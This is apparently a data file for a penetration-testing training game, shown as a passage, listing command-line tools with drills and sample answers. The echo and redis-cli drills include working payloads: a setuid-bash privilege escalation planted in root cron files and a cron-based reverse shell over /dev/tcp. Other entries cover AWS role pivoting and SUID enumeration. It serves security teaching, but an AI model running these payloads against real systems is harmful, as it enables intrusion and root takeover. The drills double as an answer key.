      useCount: 5,
      blurb:
        "Used constantly to build one-off payloads — either piped into nc for network probes, or redirected into a file to hijack something that runs later.",
      howItWorks:
        "echo prints its arguments to stdout, and on its own that's almost never the point — what matters is where that output goes next. Redirected with > or >> it becomes a way to write file contents from the command line without an editor; piped with | it becomes a way to feed one specific line of input into another program.",
      flagGlossary: [
        { flag: ">", meaning: "Redirects output into a file, overwriting anything already there." },
        { flag: ">>", meaning: "Redirects output into a file, appending to the end instead of overwriting." },
        { flag: "|", meaning: "Pipes output into the next command's stdin instead of a file." },
        { flag: "-e", meaning: 'Enables interpretation of backslash escapes like \\n (newline) inside the string.' },
      ],
      referenceBlock: ["echo '<payload>' > <file>", "echo '<payload>' >> <file>", "echo '<payload>' | nc <ip> <port>"],
      useCases: [
        'echo -e "line1\\nline2" > file.txt   — write multiple lines from one command',
        "echo $PATH                            — print an environment variable's value",
        'echo "* * * * * root id" > /etc/cron.d/test   — plant a cron entry directly (given write access)',
      ],
      drills: [
        {
          id: "echo-01",
          scenario:
            "You control a world-writable env file sourced by a root cron job. Write a payload into /tmp/backup.env that copies bash to /tmp/rootbash and sets the setuid bit.",
          accepted: { requires: ["echo", "cp /bin/bash", "chmod u+s", "/tmp/backup.env"] },
          sampleAnswer: "echo 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash' > /tmp/backup.env",
          explain:
            "> truncates the target file and writes only what you gave it — the classic way to plant a privesc payload into something that will be sourced or executed as root later. This only works because the file was world-writable in the first place; echo itself has no special privilege of its own.",
        },
        {
          id: "echo-02",
          scenario: "Append (don't overwrite) the same kind of payload to a writable cron script at /opt/netdiag/cleanup.sh.",
          accepted: { requires: ["echo", "cp /bin/bash", "chmod u+s", ">>", "/opt/netdiag/cleanup.sh"] },
          sampleAnswer: "echo 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash' >> /opt/netdiag/cleanup.sh",
          explain:
            ">> appends to the end of the file instead of replacing its contents — critical here because cleanup.sh has to remain a syntactically valid, still-functioning script for cron to keep running it; overwriting it outright risks breaking whatever made it work in the first place.",
        },
        {
          id: "echo-03",
          scenario:
            "Send a repeated-%x probe string into a suspected format-string-vulnerable service on port 6060, without opening an interactive nc session.",
          accepted: { requires: ["echo", "%x%x%x%x", "nc", "6060"] },
          sampleAnswer: 'echo "%x%x%x%x" | nc <ip> 6060',
          explain:
            "A short repeating pattern like %x%x%x%x is a cheap probe: if the service leaks stack values back to you in its response, you've confirmed a format string vulnerability exists before spending any time building the real, targeted payload.",
        },
        {
          id: "echo-04",
          scenario: "Write a two-line message into notes.txt using a single echo command with an embedded newline.",
          accepted: { requires: ["echo", "-e"] },
          sampleAnswer: 'echo -e "line1\\nline2" > notes.txt',
          explain: "-e turns on interpretation of backslash escapes like \\n — without it, echo prints \\n literally as two characters instead of an actual newline.",
        },
      ],
    },
    {
      id: "redis-cli",
      rank: 9,
      name: "redis-cli",
      useCount: 4,
      blurb: "Redis's own CLI client — this game uses it to abuse unauthenticated Redis instances into planting a cron-based reverse shell.",
      howItWorks:
        "redis-cli is Redis's own command-line client — it opens a TCP connection to a Redis server and sends the exact same commands the Redis protocol expects, one per invocation. Redis was designed assuming its port would never be internet-facing and its commands would only ever come from trusted application code, so an unauthenticated, exposed instance hands out full read/write control over its entire configuration and dataset to anyone who can reach it.",
      flagGlossary: [
        { flag: "-h <host>", meaning: "Target Redis server's address." },
        { flag: "-p <port>", meaning: "Target port, if not the Redis default of 6379." },
        { flag: "-a <password>", meaning: "Authenticate if the instance requires a password (most vulnerable instances don't)." },
        { flag: "CONFIG SET <key> <value>", meaning: "Changes a live server setting, including where and under what name it writes its dump file." },
        { flag: "SET / GET <key>", meaning: "Basic key-value read/write — the core Redis data operation." },
        { flag: "SAVE", meaning: "Forces an immediate write of the in-memory dataset to disk, using whatever dir/dbfilename are currently configured." },
      ],
      referenceBlock: [
        "redis-cli -h <ip> ping",
        "redis-cli -h <ip> config set dir /etc/cron.d/",
        "redis-cli -h <ip> config set dbfilename backdoor",
        'redis-cli -h <ip> set payload "* * * * * root /bin/bash -c \'...\'"',
        "redis-cli -h <ip> save",
      ],
      useCases: [
        "redis-cli -h <ip> info               — dump server info: version, uptime, connected clients",
        "redis-cli -h <ip> keys '*'           — list every key currently stored (huge on a busy instance, use sparingly)",
        "redis-cli -h <ip> config get dir     — check the currently configured working directory before you change it",
      ],
      drills: [
        {
          id: "redis-cli-01",
          scenario: "Check whether Redis at <ip> is reachable and unauthenticated.",
          accepted: { requires: ["redis-cli", "-h", "<ip>", "ping"] },
          sampleAnswer: "redis-cli -h <ip> ping",
          explain:
            "PING is the simplest possible Redis command — if the server answers PONG without ever asking for a password, you've confirmed there's zero authentication standing between you and full read/write control.",
        },
        {
          id: "redis-cli-02",
          scenario: "Point Redis's working directory at the system cron directory so any file it writes lands there.",
          accepted: { requires: ["redis-cli", "-h", "<ip>", "config set dir", "/etc/cron.d/"] },
          sampleAnswer: "redis-cli -h <ip> config set dir /etc/cron.d/",
          explain:
            "CONFIG SET dir changes where Redis will write its next dump file on disk. Retargeting that directory to somewhere cron will read from is the entire trick — Redis has no concept of 'files it shouldn't be allowed to write.'",
        },
        {
          id: "redis-cli-03",
          scenario: "Set a Redis key whose value is a valid crontab line running a reverse shell as root every minute.",
          accepted: { requires: ["redis-cli", "-h", "<ip>", "set payload"] },
          sampleAnswer: "redis-cli -h <ip> set payload \"* * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/op/4444 0>&1'\"",
          explain:
            "The value you SET becomes the literal bytes written to disk once SAVE runs, so it has to already be a syntactically valid file — in this case, a real crontab line, whitespace and all, or the planted job will simply fail to parse.",
        },
        {
          id: "redis-cli-04",
          scenario: "Force Redis to write its current dataset to disk now, completing the plant.",
          accepted: { requires: ["redis-cli", "-h", "<ip>", "save"] },
          sampleAnswer: "redis-cli -h <ip> save",
          explain:
            "SAVE is the trigger — everything you configured with CONFIG SET and SET stays purely in memory until this command actually writes it to disk. This is the moment your file plant becomes real and, once cron picks it up, becomes code execution.",
        },
        {
          id: "redis-cli-05",
          scenario: "Connect to a Redis instance running on a non-default port 6380 at <ip> and check its info.",
          accepted: { requires: ["redis-cli", "-h", "<ip>", "-p", "6380", "info"] },
          sampleAnswer: "redis-cli -h <ip> -p 6380 info",
          explain: "-p overrides the default port (6379) — necessary any time an instance has been moved off its standard port, whether for hardening or just convention.",
        },
        {
          id: "redis-cli-06",
          scenario: "Authenticate to a password-protected Redis instance with the password 'hunter2' before running any commands.",
          accepted: { requires: ["redis-cli", "-h", "<ip>", "-a", "hunter2"] },
          sampleAnswer: "redis-cli -h <ip> -a hunter2 ping",
          explain: "-a supplies the AUTH password up front — most real exposed instances skip auth entirely, but the moment one doesn't, this flag gets you in anyway as long as you have the password.",
        },
        {
          id: "redis-cli-07",
          scenario: "Read back the value of the key you just set, named 'payload'.",
          accepted: { requires: ["redis-cli", "-h", "<ip>", "get payload"] },
          sampleAnswer: "redis-cli -h <ip> get payload",
          explain: "GET is the read counterpart to SET — confirming a value actually stuck before you trigger SAVE is a cheap sanity check that saves you from debugging a silent typo later.",
        },
      ],
    },
    {
      id: "checksec",
      rank: 10,
      name: "checksec",
      useCount: 4,
      blurb: "Reports which binary protections (canary, NX, PIE, RELRO) are enabled — the first thing to run against any exploitation target.",
      howItWorks:
        "checksec inspects a compiled binary's headers and flags to report which memory-safety mitigations the compiler and linker actually turned on — it doesn't run or analyze the program's logic, only its build-time protections. Each mitigation blocks a specific exploitation technique, so the results tell you upfront which techniques are even worth attempting.",
      flagGlossary: [
        { flag: "Canary", meaning: "A random value placed before the return address on the stack; if a stack overflow overwrites it, the program detects the corruption and aborts before returning. No canary means a simple buffer overflow can overwrite the return address directly." },
        { flag: "NX (No-Execute)", meaning: "Marks the stack and heap as non-executable, blocking shellcode injection there — pushes exploitation toward return-oriented programming (ROP) instead." },
        { flag: "PIE (Position Independent Executable)", meaning: "Randomizes the binary's base load address each run, defeating hardcoded addresses unless you also have an info leak." },
        { flag: "RELRO", meaning: "Restricts write access to parts of the binary's memory (like the GOT) after startup — 'Full RELRO' blocks GOT-overwrite attacks entirely." },
      ],
      referenceBlock: ["checksec ./binary"],
      useCases: [
        "checksec --file=./binary          — same check, explicit long-flag form",
        "checksec --process=<pid>          — check protections on an already-running process instead of a file on disk",
      ],
      drills: [
        {
          id: "checksec-01",
          scenario: "Check what protections are compiled into ./netdiagd before planning an exploit.",
          accepted: { requires: ["checksec", "./netdiagd"] },
          sampleAnswer: "checksec ./netdiagd",
          explain:
            "The four flags checksec reports (canary/NX/PIE/RELRO) each individually rule specific exploitation techniques in or out — for example, no canary plus no PIE means a straightforward stack-smashing overflow with a hardcoded return address can work with almost no extra effort.",
        },
        {
          id: "checksec-02",
          scenario: "Same check, this time against ./diagd.",
          accepted: { requires: ["checksec", "./diagd"] },
          sampleAnswer: "checksec ./diagd",
          explain:
            "Running this before anything else means every later decision — whether to look for a ROP chain, whether you need an info leak first, whether GOT overwrite is even on the table — is grounded in what the binary actually allows, not guesswork.",
        },
        {
          id: "checksec-03",
          scenario: "Check the protections on an already-running process with PID 4021, instead of a file on disk.",
          accepted: { requires: ["checksec", "--process", "4021"] },
          sampleAnswer: "checksec --process=4021",
          explain: "--process targets a live PID instead of a binary path — useful when you have shell access to a running service but the on-disk binary isn't directly reachable.",
        },
      ],
    },
    {
      id: "aws",
      rank: 11,
      name: "aws",
      useCount: 4,
      blurb: "AWS CLI — used in campaign-tier missions for IAM/STS privilege pivoting between roles and accounts.",
      howItWorks:
        "The AWS CLI wraps AWS's REST APIs in a command-line interface — every subcommand maps to a specific API action, and the credentials you're currently configured with (via environment variables, a profile, or temporary STS credentials) determine what you're allowed to do. Because IAM permissions are role-based and often over-scoped, a pivot chain usually looks like: enumerate what your current identity can do, find a role with slightly more access, assume it, repeat.",
      flagGlossary: [
        { flag: "sts assume-role", meaning: "Exchanges your current credentials for a new, temporary set scoped to a different IAM role — the core primitive of any privilege pivot." },
        { flag: "--role-arn", meaning: "The full ARN identifying exactly which role to assume." },
        { flag: "--role-session-name", meaning: "An arbitrary label for the resulting session, shows up in that account's CloudTrail logs." },
        { flag: "iam list-role-policies", meaning: "Lists inline permissions attached directly to a given role." },
        { flag: "sts get-caller-identity", meaning: "Confirms exactly which identity (user, role, account) your current credentials actually resolve to — the first command worth running after any credential change." },
      ],
      referenceBlock: [
        "aws sts assume-role --role-arn <arn> --role-session-name <name>",
        "aws iam list-role-policies --role-name <name>",
        "aws secretsmanager list-secrets",
      ],
      useCases: [
        "aws sts get-caller-identity                — confirm which identity you're currently authenticated as",
        "aws s3 ls s3://bucket-name --no-sign-request  — list a public S3 bucket's contents without any credentials at all",
        "aws iam list-users                         — enumerate every IAM user in the account, if your role allows it",
      ],
      drills: [
        {
          id: "aws-01",
          scenario: "Assume the role arn:aws:iam::palermo:role/vendor-integration, naming the session 'pivot'.",
          accepted: {
            requires: [
              "aws sts assume-role",
              "--role-arn",
              "arn:aws:iam::palermo:role/vendor-integration",
              "--role-session-name",
              "pivot",
            ],
          },
          sampleAnswer: "aws sts assume-role --role-arn arn:aws:iam::palermo:role/vendor-integration --role-session-name pivot",
          explain:
            "assume-role calls STS (the Security Token Service) and, if the target role's trust policy allows your current identity, returns a brand new temporary access key/secret/session token scoped only to that role — this is the single API call that makes cross-role and cross-account pivoting possible in AWS.",
        },
        {
          id: "aws-02",
          scenario: "List what policies are attached to the vendor-integration role you're currently running as, to see what it can do next.",
          accepted: { requires: ["aws iam list-role-policies", "--role-name", "vendor-integration"] },
          sampleAnswer: "aws iam list-role-policies --role-name vendor-integration",
          explain:
            "--role-name targets one specific role by its friendly name rather than listing everything account-wide — the output (its attached inline policies) becomes your map of exactly what this newly-assumed identity is allowed to touch next.",
        },
        {
          id: "aws-03",
          scenario: "List every secret stored in Secrets Manager for the current credentials.",
          accepted: { requires: ["aws secretsmanager list-secrets"] },
          sampleAnswer: "aws secretsmanager list-secrets",
          explain:
            "Once you've pivoted into a role with Secrets Manager access, list-secrets needs no name or ARN to enumerate — it's the fastest way to see everything stored there before deciding what's worth reading next.",
        },
        {
          id: "aws-04",
          scenario: "Confirm exactly which identity your current AWS credentials resolve to.",
          accepted: { requires: ["aws sts get-caller-identity"] },
          sampleAnswer: "aws sts get-caller-identity",
          explain: "This is the first command worth running after any credential change — assumed role, new access key, whatever — since everything else you do depends on actually knowing who you are right now.",
        },
      ],
    },
    {
      id: "ssh",
      rank: 12,
      name: "ssh",
      useCount: 3,
      blurb: "Remote shell access — the payoff of nearly every credential-recovery objective in the game.",
      howItWorks:
        "ssh negotiates an encrypted channel to a remote host, authenticates you (by password or by proving possession of a private key), and then gives you an interactive shell on that machine as the authenticated user. Key-based auth works because the server holds a copy of your public key and challenges you to prove you hold the matching private key — it never has to see or store your password at all.",
      flagGlossary: [
        { flag: "user@host", meaning: "The standard connection target syntax." },
        { flag: "-i <keyfile>", meaning: "Use a specific private key file for authentication instead of the default ~/.ssh/id_rsa." },
        { flag: "-p <port>", meaning: "Connect to a non-default SSH port." },
        { flag: "-L <local>:<remote_host>:<remote_port>", meaning: "Local port forwarding — tunnels a remote service to a port on your own machine." },
        { flag: "-o StrictHostKeyChecking=no", meaning: "Skips the known_hosts prompt — convenient in a lab, a red flag on a real engagement since it silently disables man-in-the-middle protection." },
      ],
      referenceBlock: ["ssh <user>@<ip>", "ssh -i <keyfile> <user>@<ip>"],
      useCases: [
        "ssh -L 8080:127.0.0.1:80 user@<ip>   — tunnel a target's internal-only web service to your local port 8080",
        "scp file.txt user@<ip>:/tmp/         — copy a file to a remote host over the same protocol",
        "ssh user@<ip> 'whoami'               — run a single remote command without opening an interactive shell",
      ],
      drills: [
        {
          id: "ssh-01",
          scenario: "You recovered credentials for user rbadmin. Log into <ip> over SSH.",
          accepted: { requires: ["ssh", "rbadmin", "<ip>"] },
          sampleAnswer: "ssh rbadmin@<ip>",
          explain:
            "user@host tells ssh both who to authenticate as and where to connect — get either half wrong and you'll be prompted for credentials that can never succeed. With just a password recovered, this is the whole command; you'll be prompted interactively next.",
        },
        {
          id: "ssh-02",
          scenario: "You recovered a private key file vantage_jumpbox_key instead of a password. Use it to log in as admin.",
          accepted: { requires: ["ssh", "-i", "vantage_jumpbox_key", "admin", "<ip>"] },
          sampleAnswer: "ssh -i vantage_jumpbox_key admin@<ip>",
          explain:
            "-i points ssh at a specific private key file instead of the default search path — necessary the moment you've recovered a key that isn't already sitting in your own ~/.ssh directory under an expected name.",
        },
        {
          id: "ssh-03",
          scenario: "Connect to a jumpbox at <ip> listening on the non-default SSH port 2222, as user ops.",
          accepted: { requires: ["ssh", "-p", "2222", "ops", "<ip>"] },
          sampleAnswer: "ssh -p 2222 ops@<ip>",
          explain: "-p overrides the default port 22 — a common hardening move on internet-facing boxes, so it's worth checking during recon whether SSH has been moved elsewhere.",
        },
        {
          id: "ssh-04",
          scenario:
            "Tunnel a target's internal-only web app (its own port 80) to your local port 8080, over SSH to <ip> as user ops.",
          accepted: { requires: ["ssh", "-l", "8080:127.0.0.1:80", "ops", "<ip>"] },
          sampleAnswer: "ssh -L 8080:127.0.0.1:80 ops@<ip>",
          explain: "-L forwards a local port through the encrypted SSH tunnel to a destination the remote box can reach but you normally can't — this is how you browse an internal-only service from your own machine.",
        },
      ],
    },
    {
      id: "sudo",
      rank: 13,
      name: "sudo",
      useCount: 1,
      blurb: "Privilege escalation gateway — checking what you're allowed to run as another user is the single most valuable privesc command there is.",
      howItWorks:
        "sudo lets a user run a command as another user (almost always root), governed entirely by rules in /etc/sudoers — every rule specifies exactly which user, which commands, and as which target user is permitted. -l reads those rules back for your own account, which is why it's the highest-value single command in local privilege escalation: it tells you, directly from the system's own configuration, exactly what you're allowed to run as someone more privileged.",
      flagGlossary: [
        { flag: "-l", meaning: "Lists the sudo rules that apply to your current user, without running anything." },
        { flag: "-u <user>", meaning: "Run the target command as a specific user instead of the default root." },
        { flag: "(command)", meaning: "Runs the given command with elevated privileges, per the matching sudoers rule." },
      ],
      referenceBlock: ["sudo -l   — check what you can run as another user"],
      useCases: [
        "sudo -u www-data whoami       — run a command as a different, non-root user permitted by a sudoers rule",
        "sudo -l -U <otherusername>    — (as root) check what rules apply to a different account",
      ],
      drills: [
        {
          id: "sudo-01",
          scenario: "You have a shell. Check what commands your user is allowed to run via sudo.",
          accepted: { requires: ["sudo", "-l"] },
          sampleAnswer: "sudo -l",
          explain:
            "-l reads /etc/sudoers (and any included files) and prints exactly what your account is allowed to run as another user, with no guessing involved. A rule allowing a specific script or binary to run as root — especially one you can influence the behavior of — is usually a direct path to a root shell.",
        },
        {
          id: "sudo-02",
          scenario: "Run whoami as the user www-data, using a sudo rule that permits it.",
          accepted: { requires: ["sudo", "-u", "www-data", "whoami"] },
          sampleAnswer: "sudo -u www-data whoami",
          explain: "-u targets a specific non-root user — sudoers rules aren't always 'run as root,' and privilege escalation sometimes means pivoting sideways into a service account first.",
        },
      ],
    },
    {
      id: "find",
      rank: 14,
      name: "find",
      useCount: 1,
      blurb: "Filesystem search — this game uses it to sweep the whole disk for SUID binaries, one of the fastest privesc recon steps.",
      howItWorks:
        "find walks a directory tree recursively, testing every file and directory it encounters against the conditions you give it, and prints (or acts on) whatever matches. Unlike ls, it's built for exactly this kind of system-wide sweep — searching by permission bits, ownership, modification time, or name across the entire filesystem in one pass.",
      flagGlossary: [
        { flag: "-perm -4000", meaning: "Matches files with the SUID bit set (the 4000 octal permission bit) — binaries that run as their owner (often root) regardless of who executes them." },
        { flag: "-perm -2000", meaning: "Matches files with the SGID bit set — same idea, but for group ownership." },
        { flag: "-type f", meaning: "Restricts results to regular files, excluding directories, symlinks, etc." },
        { flag: "-user <name>", meaning: "Matches files owned by a specific user." },
        { flag: "-mtime -1", meaning: "Matches files modified within the last day — useful for spotting recently-planted files." },
        { flag: "2>/dev/null", meaning: "Not a find flag, but the idiom that goes with it — silences the flood of 'permission denied' stderr noise from directories you can't read." },
      ],
      referenceBlock: ["find / -perm -4000 -type f 2>/dev/null   — every SUID binary on the box"],
      useCases: [
        "find / -writable -type d 2>/dev/null   — every world-writable directory, a common place to plant a payload",
        "find / -name '*.conf' 2>/dev/null      — locate every config file on the box by name pattern",
        "find / -mtime -1 -type f 2>/dev/null   — files modified in the last 24 hours, useful for spotting what was recently touched",
      ],
      drills: [
        {
          id: "find-01",
          scenario: "Search the entire filesystem for SUID binaries, silencing permission-denied noise.",
          accepted: { requires: ["find", "/", "-perm", "-4000", "-type f"] },
          sampleAnswer: "find / -perm -4000 -type f 2>/dev/null",
          explain:
            "-perm -4000 matches the SUID bit specifically; -type f keeps the results to actual executables instead of directories that happen to share the bit pattern. 2>/dev/null throws away the constant 'permission denied' noise from directories you can't traverse, so only real results scroll by.",
        },
        {
          id: "find-02",
          scenario: "Search the filesystem for SGID binaries, silencing permission errors.",
          accepted: { requires: ["find", "/", "-perm", "-2000", "-type f"] },
          sampleAnswer: "find / -perm -2000 -type f 2>/dev/null",
          explain: "-perm -2000 matches the SGID bit — the group-ownership equivalent of SUID, worth checking separately since a privesc path can hinge on group membership just as easily as user identity.",
        },
        {
          id: "find-03",
          scenario: "Find every file owned by user 'backupsvc' under /home.",
          accepted: { requires: ["find", "/home", "-user", "backupsvc"] },
          sampleAnswer: "find /home -user backupsvc",
          explain: "-user filters purely by ownership, independent of permission bits — useful for tracing what a specific service account can read or has left behind.",
        },
        {
          id: "find-04",
          scenario: "Find every regular file modified in the last 24 hours anywhere on the filesystem, silencing permission errors.",
          accepted: { requires: ["find", "/", "-mtime", "-1", "-type f"] },
          sampleAnswer: "find / -mtime -1 -type f 2>/dev/null",
          explain: "-mtime -1 matches files touched within the last day — a fast way to spot something recently planted, by you or someone else, without knowing its name or location in advance.",
        },
      ],
    },
    {
      id: "strings",
      rank: 15,
      name: "strings",
      useCount: 1,
      blurb: "Pulls printable text out of a binary — a fast way to spot hardcoded paths, commands, or secrets without disassembling anything.",
      howItWorks:
        "strings scans a binary file for sequences of printable characters at least a minimum length (4 by default) and prints them — it has no understanding of the file's structure or what's code versus data, it's purely a byte-level text extractor. That crudeness is the point: it works on any binary format and instantly surfaces hardcoded paths, commands, URLs, and error messages without needing to disassemble anything.",
      flagGlossary: [
        { flag: "-a", meaning: "Scans the entire file, not just the sections strings expects to hold text — necessary for finding strings hidden in unusual sections." },
        { flag: "-t x", meaning: "Prefixes each found string with its offset in the file, printed in hexadecimal." },
        { flag: "-n <len>", meaning: "Sets the minimum string length to report (default 4), useful for filtering out short noise matches." },
      ],
      referenceBlock: ["strings -a -t x ./binary | grep <pattern>   — printable strings with offsets, filtered to one"],
      useCases: [
        "strings ./binary | less                — page through all found strings interactively",
        "strings -n 8 ./binary                   — only strings 8+ characters, cuts a lot of noise",
        "strings ./binary | grep -i http         — quickly spot any hardcoded URLs",
      ],
      drills: [
        {
          id: "strings-01",
          scenario: "Pull every printable string out of telemetryd with its offset, keeping only the reference to /bin/sh.",
          accepted: { requires: ["strings", "-a", "-t x", "./telemetryd", "grep", "/bin/sh"] },
          sampleAnswer: "strings -a -t x ./telemetryd | grep /bin/sh",
          explain:
            "-a ensures every section of the file is scanned, not just the ones strings assumes hold text, since a hidden or unusual section could still contain a plaintext reference. -t x adds each match's hex offset, which you'll need to locate the string precisely once you move to a disassembler.",
        },
        {
          id: "strings-02",
          scenario: "Pull strings at least 10 characters long out of ./binary, filtering out short noise matches.",
          accepted: { requires: ["strings", "-n", "10", "./binary"] },
          sampleAnswer: "strings -n 10 ./binary",
          explain: "-n raises the minimum length strings will report — the 4-character default catches a lot of coincidental short sequences that aren't real text, and bumping it up trims that noise.",
        },
      ],
    },
    {
      id: "whoami",
      rank: 16,
      name: "whoami",
      useCount: 1,
      blurb: "The simplest post-exploitation check there is — confirm which user your shell is actually running as before doing anything else.",
      howItWorks:
        "whoami reads the current process's effective user ID and prints the corresponding username — nothing more. It exists purely as a fast sanity check, and it's genuinely load-bearing: every privilege escalation decision downstream depends on knowing, with certainty, who you already are.",
      flagGlossary: [{ flag: "(no flags in common use)", meaning: "whoami takes no meaningful arguments — its entire value is being instant and unambiguous." }],
      referenceBlock: ["whoami"],
      useCases: [
        "id                    — a fuller version: UID, GID, and every group you belong to, not just the username",
        "whoami && hostname     — confirm both who you are and which box you're on in one line",
      ],
      drills: [
        {
          id: "whoami-01",
          scenario: "You just landed a shell through a web exploit. Confirm which user it's running as.",
          accepted: { requires: ["whoami"] },
          sampleAnswer: "whoami",
          explain:
            "No flags, no arguments — whoami just resolves and prints your effective username, which tells you immediately whether the exploit you just ran already landed you as root (nothing left to do) or as a low-privilege service account (privesc is still ahead of you).",
        },
        {
          id: "whoami-02",
          scenario: "Get a fuller picture than whoami alone — print your UID, GID, and every group you belong to.",
          accepted: { requires: ["id"], forbids: ["whoami"] },
          sampleAnswer: "id",
          explain: "id reports everything whoami does plus your full group membership — group membership is often exactly what unlocks a specific privesc path, like being in the docker or lxd group.",
        },
      ],
    },
    {
      id: "gobuster",
      rank: 17,
      name: "gobuster",
      useCount: 2,
      blurb: "Directory brute-forcer — finds hidden paths on a web server that aren't linked from anywhere visible.",
      howItWorks:
        "gobuster takes a wordlist and, for each word, sends a real HTTP request to the target using that word as a path, then reports which requests came back with a 'real' status code (200, 301, 403, etc.) instead of a 404. It's brute force in the most literal sense — trading raw request volume for the ability to find paths that were never linked from anywhere a normal crawl would find.",
      flagGlossary: [
        { flag: "dir", meaning: "The mode for brute-forcing directory/file paths on a web server (as opposed to dns or vhost modes)." },
        { flag: "-u <url>", meaning: "The base URL to test paths against." },
        { flag: "-w <wordlist>", meaning: "The wordlist file supplying the candidate paths." },
        { flag: "-x <ext>", meaning: "Appends file extensions (e.g. -x php,txt) to each word, useful for finding specific file types." },
        { flag: "-t <n>", meaning: "Number of concurrent threads — higher is faster but noisier and more likely to trip rate limiting." },
      ],
      referenceBlock: ["gobuster dir -u http://<ip> -w <wordlist>"],
      useCases: [
        "gobuster dir -u http://<ip> -w common.txt -x php,bak   — also try each word with .php and .bak appended",
        "gobuster dns -d target-corp.com -w subdomains.txt       — brute-force subdomains instead of paths",
        "gobuster dir -u http://<ip> -w common.txt -t 50         — increase thread count for a faster (louder) scan",
      ],
      drills: [
        {
          id: "gobuster-01",
          scenario: "Brute-force hidden directories on http://<ip> using the common.txt wordlist.",
          accepted: { requires: ["gobuster dir", "-u", "http://<ip>", "-w", "common.txt"] },
          sampleAnswer: "gobuster dir -u http://<ip> -w common.txt",
          explain:
            "dir mode is gobuster's directory/file brute-force mode; -u and -w give it the two things it needs — where to test and what words to try. Every request is real, so a busy scan is easy for a target's logs (or a WAF) to notice; this is inherently a loud technique, not a subtle one.",
        },
        {
          id: "gobuster-02",
          scenario: "Brute-force http://<ip> with common.txt, also trying .php and .bak on every word.",
          accepted: { requires: ["gobuster dir", "-u", "-w", "-x", "php", "bak"] },
          sampleAnswer: "gobuster dir -u http://<ip> -w common.txt -x php,bak",
          explain: "-x appends each listed extension to every wordlist entry, multiplying your coverage — critical against a target where you already suspect a specific backend language.",
        },
        {
          id: "gobuster-03",
          scenario: "Run the same scan with 50 concurrent threads for more speed.",
          accepted: { requires: ["gobuster dir", "-u", "-w", "-t", "50"] },
          sampleAnswer: "gobuster dir -u http://<ip> -w common.txt -t 50",
          explain: "-t raises the thread count for faster results, but also produces a much louder, more obvious burst of traffic against the target — worth weighing against how much stealth actually matters.",
        },
      ],
    },
    {
      id: "tcpdump",
      rank: 18,
      name: "tcpdump",
      useCount: 0,
      realWorldOnly: true,
      blurb:
        "Packet capture from the command line — the first tool reached for when something needs to be seen on the wire, whether you're threat hunting or just proving a connection happened.",
      howItWorks:
        "tcpdump uses a kernel-level packet capture facility (libpcap) to see every packet crossing a given network interface before it's processed by any application, then decodes and prints each one's headers (and optionally payload) according to the protocol it recognizes. Because it operates below the application layer, it sees traffic exactly as it appears on the wire — including traffic your own applications never surface to you, like failed connection attempts or malformed packets.",
      flagGlossary: [
        { flag: "-i <interface>", meaning: "Which network interface to capture on (eth0, any, etc.)." },
        { flag: "host <ip>", meaning: "Filter expression: only packets to/from a specific address." },
        { flag: "port <n>", meaning: "Filter expression: only packets on a specific port." },
        { flag: "-w <file>", meaning: "Write raw captured packets to a file (a .pcap) instead of printing a decoded summary." },
        { flag: "-r <file>", meaning: "Read and print packets from a previously saved .pcap file." },
        { flag: "-X", meaning: "Print each packet's payload in hex and ASCII, not just its headers." },
      ],
      referenceBlock: [
        "tcpdump -i eth0                  — capture on eth0, all traffic",
        "tcpdump -i eth0 host <ip>        — only traffic to/from one host",
        "tcpdump -i eth0 port 443         — only traffic on one port",
        "tcpdump -i eth0 -w capture.pcap  — write to a file instead of printing live",
      ],
      useCases: [
        "tcpdump -i eth0 -c 20                — capture exactly 20 packets, then stop",
        "tcpdump -i eth0 -X port 80           — show HTTP traffic's headers AND payload bytes",
        "tcpdump -r capture.pcap 'tcp port 443'  — filter a saved capture file after the fact",
      ],
      drills: [
        {
          id: "tcpdump-01",
          scenario: "Capture all traffic on interface eth0 and print it live.",
          accepted: { requires: ["tcpdump", "-i", "eth0"] },
          sampleAnswer: "tcpdump -i eth0",
          explain:
            "-i selects the interface to listen on. Without a filter expression, tcpdump prints a one-line summary of every single packet crossing it — source, destination, flags, size — which is a firehose on any non-trivial network.",
        },
        {
          id: "tcpdump-02",
          scenario: "Capture only traffic to or from 10.10.10.5 on eth0.",
          accepted: { requires: ["tcpdump", "-i", "eth0", "host", "10.10.10.5"] },
          sampleAnswer: "tcpdump -i eth0 host 10.10.10.5",
          explain:
            "host <ip> is a Berkeley Packet Filter (BPF) expression — tcpdump compiles it down to run efficiently in the kernel itself, so filtering here is far cheaper than capturing everything and grepping afterward.",
        },
        {
          id: "tcpdump-03",
          scenario: "Write a capture of all HTTPS traffic on eth0 to a file named capture.pcap instead of printing it.",
          accepted: { requires: ["tcpdump", "-i", "eth0", "port 443", "-w", "capture.pcap"] },
          sampleAnswer: "tcpdump -i eth0 port 443 -w capture.pcap",
          explain:
            "-w switches tcpdump from printing decoded summaries to writing the raw, unmodified packets to disk — the .pcap format Wireshark (and tcpdump's own -r) can later read back for deep, visual analysis.",
        },
        {
          id: "tcpdump-04",
          scenario: "Read back a previously saved capture file named capture.pcap and print its contents.",
          accepted: { requires: ["tcpdump", "-r", "capture.pcap"] },
          sampleAnswer: "tcpdump -r capture.pcap",
          explain: "-r reverses -w's job — reading raw packets back from a file instead of a live interface, so you can analyze a capture after the fact, including one taken by someone else.",
        },
        {
          id: "tcpdump-05",
          scenario: "Capture HTTP traffic on eth0, showing both headers and the raw payload bytes in hex.",
          accepted: { requires: ["tcpdump", "-i", "eth0", "-x", "port 80"] },
          sampleAnswer: "tcpdump -i eth0 -X port 80",
          explain: "-X adds a hex+ASCII dump of each packet's payload below its header summary — necessary the moment you need to actually read what's inside a packet, like an unencrypted HTTP request.",
        },
      ],
    },
    {
      id: "hashcat",
      rank: 19,
      name: "hashcat",
      useCount: 0,
      realWorldOnly: true,
      blurb:
        "GPU-accelerated password cracker — once you've dumped hashes (an AD DCSync, a leaked database, a cracked archive), this is what actually recovers the plaintext.",
      howItWorks:
        "hashcat takes a captured hash and, for each candidate password from a wordlist (or generated by a mask/rules), applies the exact same hashing algorithm the original system used, then compares the result to the target hash byte-for-byte. It never 'decrypts' anything — hashing is one-way by design — it's brute-force guessing accelerated by running millions of those guesses in parallel on a GPU.",
      flagGlossary: [
        { flag: "-m <mode>", meaning: "Hash type identifier — this MUST exactly match how the hash was generated (0 = MD5, 1000 = NTLM, 1800 = sha512crypt, etc.) or nothing will ever crack." },
        { flag: "-a 0", meaning: "Attack mode: straight/dictionary — try each wordlist entry as-is." },
